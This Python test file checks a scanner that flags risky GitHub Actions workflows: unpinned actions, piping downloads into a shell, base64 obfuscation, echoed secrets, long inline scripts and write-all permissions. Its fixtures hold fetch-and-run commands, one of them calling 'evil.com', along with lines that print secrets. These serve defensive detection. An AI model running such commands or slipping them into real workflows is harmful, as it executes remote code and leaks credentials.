import pytest
from analysis.detector import (
    detectUnpinnedActions,
    detectCurlBash,
    detectBase64Obfuscation,
    detectSecretExposure,
    detectLongInlineScripts,
    detectDangerousPermissions,
    detectAll
)

class TestUnpinnedActions:
    
    def test_detects_action_without_ref(self):
        yaml_text = """
        steps:
          - uses: actions/checkout
        """
        findings = detectUnpinnedActions(yaml_text)
        assert len(findings) == 1
        assert findings[0]['type'] == 'unpinned_action'
        assert 'checkout' in findings[0]['message']
    
    def test_detects_action_with_tag(self):
        yaml_text = """
        steps:
          - uses: actions/checkout@v4
        """
        findings = detectUnpinnedActions(yaml_text)
        assert len(findings) == 1
        assert 'v4' in findings[0]['message']
    
    def test_allows_action_with_sha(self):
        yaml_text = """
        steps:
          - uses: actions/checkout@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
        """
        findings = detectUnpinnedActions(yaml_text)
        assert len(findings) == 0
    
    def test_ignores_local_actions(self):
        yaml_text = """
        steps:
          - uses: ./local-action
        """
        findings = detectUnpinnedActions(yaml_text)
        assert len(findings) == 0
    
    def test_multiple_unpinned_actions(self):
        yaml_text = """
        steps:
          - uses: actions/checkout@v4
          - uses: actions/setup-python
          - uses: some/action@main
        """
        findings = detectUnpinnedActions(yaml_text)
        assert len(findings) == 3


class TestCurlBash:
    
    def test_detects_curl_pipe_bash(self):
        yaml_text = """
        steps:
          - run: curl https://example.com/script.sh | bash
        """
        findings = detectCurlBash(yaml_text)
        assert len(findings) == 1
        assert findings[0]['type'] == 'curl_pipe_bash'
    
    def test_detects_wget_pipe_sh(self):
        yaml_text = """
        steps:
          - run: wget -O- https://example.com/script.sh | sh
        """
        findings = detectCurlBash(yaml_text)
        assert len(findings) == 1
    
    def test_detects_curl_pipe_zsh(self):
        yaml_text = """
        steps:
          - run: curl https://install.sh | zsh
        """
        findings = detectCurlBash(yaml_text)
        assert len(findings) == 1
    
    def test_ignores_safe_curl(self):
        yaml_text = """
        steps:
          - run: curl -o script.sh https://example.com/script.sh
        """
        findings = detectCurlBash(yaml_text)
        assert len(findings) == 0


class TestBase64Obfuscation:
    
    def test_detects_long_base64_string(self):
        yaml_text = """
        steps:
          - run: echo "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB2ZXJ5IGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVkIGJ5IEd1YXJkaWFu" | base64 -d
        """
        findings = detectBase64Obfuscation(yaml_text)
        assert len(findings) >= 1
        assert findings[0]['type'] == 'base64_obfuscation'
    
    def test_ignores_short_base64(self):
        yaml_text = """
        steps:
          - run: echo "SGVsbG8=" | base64 -d
        """
        findings = detectBase64Obfuscation(yaml_text)
        assert len(findings) == 0


class TestSecretExposure:
    
    def test_detects_secret_in_echo(self):
        yaml_text = """
        steps:
          - run: echo ${{ secrets.API_KEY }}
        """
        findings = detectSecretExposure(yaml_text)
        assert len(findings) == 1
        assert findings[0]['type'] == 'secret_exposure'
    
    def test_detects_secret_in_printf(self):
        yaml_text = """
        steps:
          - run: printf "Key: %s" "${{ secrets.TOKEN }}"
        """
        findings = detectSecretExposure(yaml_text)
        assert len(findings) == 1


class TestLongInlineScripts:
    
    def test_detects_long_script(self):
        yaml_parsed = {
            'jobs': {
                'build': {
                    'steps': [
                        {
                            'name': 'Long script',
                            'run': 'a' * 250  # Script longer than threshold
                        }
                    ]
                }
            }
        }
        findings = detectLongInlineScripts(yaml_parsed)
        assert len(findings) == 1
        assert findings[0]['type'] == 'long_inline_script'
        assert findings[0]['length'] == 250
    
    def test_ignores_short_script(self):
        yaml_parsed = {
            'jobs': {
                'build': {
                    'steps': [
                        {
                            'name': 'Short script',
                            'run': 'echo "Hello World"'
                        }
                    ]
                }
            }
        }
        findings = detectLongInlineScripts(yaml_parsed)
        assert len(findings) == 0


class TestDangerousPermissions:
    
    def test_detects_top_level_write_all(self):
        yaml_parsed = {
            'permissions': 'write-all'
        }
        findings = detectDangerousPermissions(yaml_parsed)
        assert len(findings) == 1
        assert findings[0]['type'] == 'dangerous_permissions'
    
    def test_detects_job_level_write_all(self):
        yaml_parsed = {
            'jobs': {
                'build': {
                    'permissions': 'write-all'
                }
            }
        }
        findings = detectDangerousPermissions(yaml_parsed)
        assert len(findings) == 1
        assert 'build' in findings[0]['message']
    
    def test_ignores_specific_permissions(self):
        yaml_parsed = {
            'permissions': {
                'contents': 'read',
                'pull-requests': 'write'
            }
        }
        findings = detectDangerousPermissions(yaml_parsed)
        assert len(findings) == 0


class TestDetectAll:
    
    def test_detects_multiple_issues(self):
        yaml_text = """
        name: Test Workflow
        permissions: write-all
        
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout
              - run: curl https://evil.com/script.sh | bash
        """
        
        yaml_parsed = {
            'permissions': 'write-all',
            'jobs': {
                'test': {
                    'steps': []
                }
            }
        }
        
        findings = detectAll(yaml_text, yaml_parsed, "test.yaml")
        
        # Should detect: unpinned action, curl|bash, dangerous permissions
        assert len(findings) >= 3
        
        types = [f['type'] for f in findings]
        assert 'unpinned_action' in types
        assert 'curl_pipe_bash' in types
        assert 'dangerous_permissions' in types
    
    def test_adds_filename_to_findings(self):
        yaml_text = "uses: actions/checkout"
        findings = detectAll(yaml_text, None, "workflow.yaml")
        
        assert len(findings) > 0
        for finding in findings:
            assert finding['file'] == 'workflow.yaml'


# Run tests with: python -m pytest tests/test_detector.py -v